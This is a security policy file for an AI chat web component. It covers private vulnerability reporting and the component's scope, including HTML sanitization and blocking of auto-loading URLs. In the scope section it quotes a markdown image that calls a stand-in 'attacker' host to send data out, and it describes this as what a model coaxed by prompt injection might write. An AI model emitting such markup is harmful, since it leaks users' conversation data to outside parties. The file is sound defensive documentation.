# Security Policy

## Supported versions

`ai-chat-element` follows semver. Security fixes land on the latest published
minor and are released as a patch. Only the latest release is supported —
please upgrade before reporting an issue against an older version.

## Reporting a vulnerability

**Please do not open a public GitHub issue for security problems.**

Report privately through GitHub's
[**Report a vulnerability**](https://github.com/MahmoudSr/ai-chat-element/security/advisories/new)
flow (Security → Advisories), or email **srouji.mahmoud@gmail.com** with
`[security]` in the subject.

Please include:

- the version you're using,
- a description of the issue and its impact,
- steps or a minimal reproduction, and
- any suggested fix, if you have one.

You'll get an acknowledgement within a few days. Once a fix is out, credit is
happily given in the release notes unless you'd rather stay anonymous.

## Scope — what this component is responsible for

`<ai-chat>` is a **UI component**. It renders chat messages and streams
responses; it does not hold credentials or talk to any AI provider on its own.
That shapes what counts as a vulnerability here:

**In scope**

- **Markdown / HTML rendering.** Assistant and user content is rendered as
  markdown. It is sanitized with [DOMPurify](https://github.com/cure53/DOMPurify)
  before insertion, and the render pipeline runs inside the Shadow DOM. A payload
  that survives sanitization and executes script, exfiltrates data, or escapes
  the intended DOM is a vulnerability — please report it. (See
  `test/markdown.test.ts` for the XSS cases already covered.)
- **Nothing in a message loads a URL by itself.** Images, `style` attributes and
  tags, `srcset`, media, SVG images and image inputs are removed before render,
  so a model coaxed into writing `![](https://attacker/?d=…)` cannot send data
  out ("markdown image exfiltration"). Apps that need images opt in with
  `allow-images` and an `image-hosts` allowlist; only `https:` loads, with no
  referrer. Links always carry `rel="noopener noreferrer"`. A way to make a
  rendered message fetch a URL without the user clicking is a vulnerability.
  (Covered in `test/image-exfiltration.test.ts`.)
- Any way the component itself leaks data across conversations or instances, or
  mishandles a `signal`/abort such that a stopped stream keeps running.

**Out of scope (by design)**

- **API keys in the browser.** The built-in `openAIAdapter` / `anthropicAdapter`
  can take an `apiKey`, which is only safe for local dev or keyless local
  servers. For anything users can reach, the key belongs on **your** server and
  the browser should talk to it via `functionAdapter`. The README calls this out
  repeatedly; a key exposed because it was shipped to the browser is a
  configuration choice, not a component bug.
- The security of the AI provider or your own backend endpoint.
- Vulnerabilities in a consumer's app code that merely uses this component.

When in doubt, report it — we'd rather triage an out-of-scope report than miss a
real one.
